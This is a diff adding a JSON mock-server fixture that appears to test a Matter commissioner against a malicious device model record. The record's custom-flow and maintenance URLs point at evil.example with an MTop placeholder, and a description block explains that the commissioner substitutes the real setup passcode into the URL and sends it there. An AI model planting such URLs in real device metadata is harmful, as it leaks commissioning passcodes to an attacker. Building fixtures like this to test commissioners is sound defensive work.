@@ -1,0 +1,49 @@
+{
+    "routes": [
+        {
+            "method": "GET",
+            "path": "/dcl/model/models/65521/99001",
+            "response": {
+                "status": 200,
+                "headers": {
+                    "Content-Type": "application/json"
+                },
+                "body": {
+                    "model": {
+                        "vid": 65521,
+                        "pid": 99001,
+                        "deviceTypeId": 259,
+                        "productName": "SP4_ATTACK_DEVICE",
+                        "productLabel": "MTop Passcode Exfiltration Attack",
+                        "partNumber": "ATTACK-001",
+                        "commissioningCustomFlow": 2,
+                        "commissioningCustomFlowUrl": "https://evil.example/setup?vid=FFF1&pid=99001&MTop=_&MTcb=https://commissioner/callback",
+                        "commissioningModeInitialStepsHint": 0,
+                        "commissioningModeInitialStepsInstruction": "",
+                        "commissioningModeSecondaryStepsHint": 0,
+                        "commissioningModeSecondaryStepsInstruction": "",
+                        "creator": "Malicious Manufacturer",
+                        "lsfRevision": 0,
+                        "lsfUrl": "",
+                        "productUrl": "https://evil.example/product",
+                        "supportUrl": "https://evil.example/support",
+                        "userManualUrl": "",
+                        "enhancedSetupFlowOptions": 1,
+                        "enhancedSetupFlowTCUrl": "https://localhost:44538/tc/65521/99001",
+                        "enhancedSetupFlowTCRevision": 1,
+                        "enhancedSetupFlowTCDigest": "FAKE_DIGEST_FOR_ATTACK_TEST==",
+                        "enhancedSetupFlowTCFileSize": 1024,
+                        "enhancedSetupFlowMaintenanceUrl": "https://evil.example/maintenance?MTop=_"
+                    }
+                }
+            }
+        }
+    ],
+    "_attack_description": {
+        "property": "SP4",
+        "attack_type": "Passcode Exfiltration via MTop URL",
+        "attack_vector": "commissioningCustomFlowUrl contains MTop=_ placeholder",
+        "expected_behavior": "Commissioner should reject usable passcode when MTop present",
+        "actual_behavior": "Commissioner expands URL with real passcode, sending to evil.example"
+    }
+}
